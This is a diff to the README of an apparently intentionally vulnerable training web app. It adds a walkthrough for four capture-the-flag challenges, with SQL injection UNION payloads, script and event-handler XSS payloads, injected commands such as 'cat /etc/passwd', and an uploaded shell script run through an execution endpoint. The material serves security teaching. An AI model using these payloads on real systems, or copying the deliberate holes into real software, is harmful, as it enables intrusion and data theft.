@@ -170,65 +170,188 @@ If you prefer to set up manually:
 - **Input Validation**: Server-side validation for all inputs
 - **CORS Protection**: Configured for secure cross-origin requests
 
-## ⚠️ Security Challenge: SQL Injection Vulnerability
+## ⚠️ Security Challenge: Multiple Vulnerabilities
 
-This application contains an **intentional SQL injection vulnerability** for educational purposes. The flag `ninja{sql_injection_sucessful_}` is hidden in a secret table that can be accessed through SQL injection.
+This application contains **intentional security vulnerabilities** for educational purposes. There are four hidden flags that can be accessed through different attack vectors:
 
-### How to Find the Vulnerability
+1. **SQL Injection Vulnerability** - Flag: `ninja{sql_injection_sucessful_}`
+2. **Cross-Site Scripting (XSS) Vulnerability** - Flag: `ninja{xss_vulnerability_exploited_}`
+3. **Command Injection Vulnerability** - Flag: `ninja{command_injection_successful_}`
+4. **File Upload Vulnerability** - Flag: `ninja{file_upload_vulnerability_exploited_}`
 
+### How to Find the Flags
+
+#### 1. SQL Injection Vulnerability
+
+**Location**: Search functionality (`/search` page)
+
+**What Makes It Vulnerable**:
+The search endpoint uses direct string concatenation instead of parameterized queries, making it vulnerable to SQL injection.
+
+**Steps to Exploit**:
 1. **Start the application** and create a user account
 2. **Login** to the application
 3. **Navigate to the Search page** (`/search`)
-4. **Use SQL injection payloads** in the search field to exploit the vulnerability
+4. **Use SQL injection payloads** in the search field:
 
-### SQL Injection Payloads to Try
-
-#### Basic Union-based injection:
+**Basic Union-based injection**:
 ```
 ' UNION SELECT 1,2,3,4,5 FROM secret_flags --
 ```
 
-#### Extract the flag:
+**Extract the flag**:
 ```
 ' UNION SELECT 1,flag_name,flag_value,description,5 FROM secret_flags --
 ```
 
-#### Alternative payloads:
+**Alternative payloads**:
 ```
 ' UNION SELECT 1,2,3,4,5 FROM sqlite_master WHERE type='table' --
-' UNION SELECT 1,2,3,4,5 FROM secret_flags --
+' UNION SELECT 1,'FLAG',flag_value,'DESCRIPTION',5 FROM secret_flags WHERE flag_name='sql_injection' --
 ```
 
-### What Happens
+**Expected Result**: The flag `ninja{sql_injection_sucessful_}` will appear in the search results.
 
-The search functionality uses direct string concatenation instead of parameterized queries, making it vulnerable to SQL injection. When you inject SQL code, it gets executed directly in the database query, allowing you to:
+#### 2. Cross-Site Scripting (XSS) Vulnerability
 
-- Access the hidden `secret_flags` table
-- Extract the flag `ninja{sql_injection_sucessful_}`
-- Potentially access other database tables
+**Location**: Search functionality (`/search` page)
 
-### Learning Objectives
+**What Makes It Vulnerable**:
+The search query is rendered directly in the DOM using `dangerouslySetInnerHTML` without sanitization, allowing XSS attacks.
 
-- Understand how SQL injection vulnerabilities occur
-- Learn to identify vulnerable code patterns
-- Practice SQL injection techniques in a safe environment
-- Recognize the importance of using parameterized queries
+**Steps to Exploit**:
+1. **Login** to the application
+2. **Navigate to the Search page** (`/search`)
+3. **Use XSS payloads** in the search field:
 
-**Note**: This vulnerability is intentionally placed for educational purposes. In real applications, always use parameterized queries to prevent SQL injection attacks.
+**Basic XSS to extract flag**:
+```html
+<script>alert(document.getElementById('xss-flag').getAttribute('data-flag'))</script>
+```
 
-### Testing the Vulnerability
+**Alternative XSS payloads**:
+```html
+<img src=x onerror='alert(document.getElementById("xss-flag").getAttribute("data-flag"))'>
+<svg onload='alert(document.getElementById("xss-flag").getAttribute("data-flag"))'>
+<script>console.log('XSS Flag:', document.getElementById('xss-flag').getAttribute('data-flag'))</script>
+```
 
-A test script `test_sql_injection.js` is included to demonstrate the vulnerability:
+**Expected Result**: 
+- An alert will pop up showing the flag `ninja{xss_vulnerability_exploited_}`
+- Or check the browser console for the flag
+- The flag is stored in a hidden div with ID `xss-flag`
+
+#### 3. Command Injection Vulnerability
+
+**Location**: System Info endpoint (`/api/system-info`)
+
+**What Makes It Vulnerable**:
+The endpoint directly executes user input as system commands without sanitization, allowing command injection attacks.
+
+**Steps to Exploit**:
+1. **Login** to the application
+2. **Navigate to the Search page** (contains the command injection testing interface)
+3. **Use the Command Injection Testing section** or make direct API calls
+
+**Basic system commands**:
+```
+whoami
+pwd
+ls -la
+cat /etc/passwd
+uname -a
+```
+
+**Extract the flag from database**:
+```
+sqlite3 users.db 'SELECT flag_value FROM command_injection_flags WHERE flag_name="command_injection"'
+```
+
+**Chain commands**:
+```
+whoami && pwd && ls
+```
+
+**Direct API call** (using curl or Postman):
+```bash
+curl -H "Authorization: Bearer YOUR_TOKEN" \
+     "http://localhost:5000/api/system-info?command=whoami"
+```
+
+**Expected Result**: The command output will show system information, and the flag `ninja{command_injection_successful_}` can be extracted.
+
+#### 4. File Upload Vulnerability
+
+**Location**: File upload functionality and processing endpoint
+
+**What Makes It Vulnerable**:
+- No file type validation - allows any file type including executables
+- Direct file execution through `/api/process-file/:filename` endpoint
+- No content validation or sanitization
+
+**Steps to Exploit**:
+1. **Login** to the application
+2. **Navigate to the Upload page** (`/upload`)
+3. **Create a malicious file** with the following content:
+
+**Create a shell script** (`malicious.sh`):
+```bash
+#!/bin/bash
+echo "ninja{file_upload_vulnerability_exploited_}"
+echo "Command injection successful!"
+whoami
+pwd
+ls -la
+```
+
+4. **Upload the malicious file** through the web interface
+5. **Execute the uploaded file** using the vulnerable endpoint:
+
+**Direct API call**:
+```bash
+curl -H "Authorization: Bearer YOUR_TOKEN" \
+     "http://localhost:5000/api/process-file/FILENAME"
+```
+
+**Expected Result**: The malicious file will execute and output the flag `ninja{file_upload_vulnerability_exploited_}` along with system information.
+
+### Automated Testing
+
+A comprehensive test script `test_sql_injection.js` is included to automatically test all vulnerabilities:
 
 ```bash
-# Install axios if not already installed
-npm install axios
+# Install required dependencies
+npm install axios form-data
 
-# Run the test script (update username/password first)
+# Update username/password in the script
+# Run the test script
 node test_sql_injection.js
 ```
 
-The script will automatically test various SQL injection payloads and extract the flag.
+The script will:
+- Test SQL injection with various payloads
+- Provide XSS payloads for manual testing
+- Test command injection with system commands
+- Create and upload a malicious file to test file upload vulnerability
+
+### What Happens
+
+Each vulnerability demonstrates different attack vectors:
+
+- **SQL Injection**: Direct string concatenation in database queries
+- **XSS**: Unsanitized user input rendered in DOM
+- **Command Injection**: Direct command execution without input validation
+- **File Upload**: No file type restrictions and direct file execution
+
+### Learning Objectives
+
+- Understand how different types of vulnerabilities occur
+- Learn to identify vulnerable code patterns
+- Practice various exploitation techniques in a safe environment
+- Recognize the importance of proper input validation and sanitization
+- Understand the impact of combining multiple vulnerabilities
+
+**Note**: These vulnerabilities are intentionally placed for educational purposes. In real applications, always implement proper security measures to prevent these attacks.
 
 ## File Storage
 
@@ -309,4 +432,3 @@ For issues and questions:
 - Database backups
 - File compression
 - CDN integration
-
